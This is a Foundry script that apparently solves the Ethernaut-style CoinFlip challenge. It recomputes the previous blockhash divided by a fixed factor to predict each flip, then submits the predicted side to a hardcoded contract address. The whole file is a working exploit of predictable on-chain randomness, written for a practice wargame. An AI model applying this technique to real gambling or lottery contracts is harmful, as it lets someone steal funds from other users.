// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/CoinFlip.sol";

contract CoinFlipScript is Script {

    CoinFlip public coinFlip = CoinFlip(0xb88304f16C30B1cfBA8e481bdE40EED4999789Cd);

    /**
     * Solution: Everything on the blockchain is deterministic. Run this method 10 times and you are the winner
     */
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 coinFlipp = blockValue / FACTOR;
        bool side = coinFlipp == 1 ? true : false;

        coinFlip.flip(side);
        console.log("Consecutive wins", coinFlip.consecutiveWins());

        vm.stopBroadcast();
    }
}
